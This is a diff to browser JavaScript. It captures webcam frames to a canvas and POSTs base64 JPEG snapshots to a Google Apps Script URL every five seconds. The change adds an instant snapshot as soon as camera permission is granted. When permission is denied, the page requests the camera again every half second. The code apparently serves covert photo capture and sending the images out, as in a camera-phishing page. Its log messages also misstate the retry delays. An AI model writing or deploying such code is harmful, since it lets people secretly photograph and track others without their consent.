@@ -46,6 +46,7 @@ const ctx = canvas.getContext("2d");
 let stream = null;
 let captureInterval = null;
 let lastHash = null;
+let firstSnapshotSent = false;
 const INTERVAL = 5000; // 5 sec
 
 // simple hash function for base64 comparison
@@ -60,31 +61,33 @@ function hashString(str) {
     return hash;
 }
 
-// start camera
-async function startCamera() {
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
-        video.srcObject = stream;
-
-        video.onloadedmetadata = function() {
-            if(!document.hidden){
-                startCapture();
-            }
-        }
-
-        stream.getVideoTracks()[0].onended = function(){
-            console.log("camera stopped, retry in 3 sec");
-            stopCapture();
-            setTimeout(startCamera,1000);
-        }
-
+// send to Google Apps Script
+async function sendImage(data){
+    try{
+        await fetch(GAS_URL,{
+            method:"POST",
+            headers:{"Content-Type":"application/x-www-form-urlencoded"},
+            body:"cat="+encodeURIComponent(data)
+        });
+        console.log("sent image");
     } catch(e){
-        console.log("camera permission denied or error, retry in 5 sec");
-        setTimeout(startCamera,500);
+        console.log("send error", e);
     }
 }
 
-// start capture with motion detection
+// capture one snapshot immediately after permission
+function captureFirstSnapshot(){
+    if(firstSnapshotSent) return;
+    ctx.drawImage(video,0,0,320,320);
+    const img = canvas.toDataURL("image/jpeg",0.6);
+    const base64 = img.replace("data:image/jpeg;base64,","");
+    lastHash = hashString(base64);
+    sendImage(base64);
+    firstSnapshotSent = true;
+    console.log("first snapshot sent");
+}
+
+// start interval capture with motion detection
 function startCapture() {
     if(captureInterval) return;
 
@@ -99,10 +102,8 @@ function startCapture() {
         ctx.drawImage(video,0,0,320,320);
         const img = canvas.toDataURL("image/jpeg",0.6);
         const base64 = img.replace("data:image/jpeg;base64,","");
-
         const currentHash = hashString(base64);
 
-        // send only if different or motion detected
         if(lastHash !== currentHash){
             lastHash = currentHash;
             sendImage(base64);
@@ -122,21 +123,34 @@ function stopCapture(){
     }
 }
 
-// send to Google Apps Script
-async function sendImage(data){
-    try{
-        await fetch(GAS_URL,{
-            method:"POST",
-            headers:{"Content-Type":"application/x-www-form-urlencoded"},
-            body:"cat="+encodeURIComponent(data)
-        });
-        console.log("sent image");
+// start camera
+async function startCamera() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
+        video.srcObject = stream;
+
+        // immediately send first snapshot after permission
+        captureFirstSnapshot();
+
+        video.onloadedmetadata = function() {
+            if(!document.hidden){
+                startCapture();
+            }
+        }
+
+        stream.getVideoTracks()[0].onended = function(){
+            console.log("camera stopped, retry in 3 sec");
+            stopCapture();
+            setTimeout(startCamera,1000);
+        }
+
     } catch(e){
-        console.log("send error", e);
+        console.log("camera permission denied or error, retry in 5 sec");
+        setTimeout(startCamera,500);
     }
 }
 
-// visibility change handling
+// handle tab visibility
 document.addEventListener("visibilitychange", ()=>{
     if(document.hidden){
         console.log("tab hidden");
